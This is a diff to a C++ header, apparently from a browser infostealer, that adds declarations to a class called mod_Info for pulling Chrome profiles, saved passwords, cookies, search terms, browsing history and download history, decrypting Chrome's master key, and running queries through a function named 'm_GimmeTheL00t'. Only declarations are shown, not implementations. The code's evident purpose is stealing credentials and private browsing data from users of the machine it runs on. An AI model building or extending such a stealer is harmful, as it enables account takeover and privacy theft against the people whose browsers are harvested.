@@ -88,6 +88,11 @@ class mod_Info {
 		}
 
 	private:
+
+		std::vector<std::vector<std::string>> m_GimmeTheL00t(const char* cQuery, const char* cPath);
+		///////////////////////////////////////////////
+		///             GOOGLE CHROME               ///
+		///////////////////////////////////////////////
 		BCRYPT_ALG_HANDLE hAlgorithm = 0;
 		BCRYPT_KEY_HANDLE hKey = 0;
 		BCRYPT_KEY_HANDLE hKey2 = 0;
@@ -95,11 +100,11 @@ class mod_Info {
 		//Primero llamar a esta funcion la cual obtiene los perfiles y la llave maestra
 		std::vector<Chrome_Profile> m_ChromeProfiles();
 		std::vector<Chrome_Login_Data> m_ProfilePasswords(const std::string& strUserPath);
-		std::vector<Cookie> m_ProfileCookies(const std::string& strUserPath, const std::string& name);
+		std::vector<Cookie> m_ProfileCookies(const std::string& strUserPath);
+		std::vector<Chrome_Search_Terms> m_ProfileSearchTerms(const std::string& strUserPath);
+		std::vector<Chrome_History> m_ProfileBrowsingHistory(const std::string& strUserPath);
+		std::vector<Chrome_Download_History> m_ProfileDownloadHistory(const std::string& strUserPath);
 		
-
-		std::vector<std::string> m_Usuarios();
-
 		//Descifrar llave maestra y datos cifrados
 		std::string m_DecryptMasterKey(const std::string& strPass);
 		std::string m_DecryptData(const std::string& strPass);
@@ -110,6 +115,10 @@ class mod_Info {
 
 		//Vector que aloja informacion de perfiles
 		std::vector<Chrome_Profile> vcChromeProfiles;
+		///////////////////////////////////////////////
+		///////////////////////////////////////////////
+
+		std::vector<std::string> m_Usuarios();
 
 		std::string strBasePath = "";
 
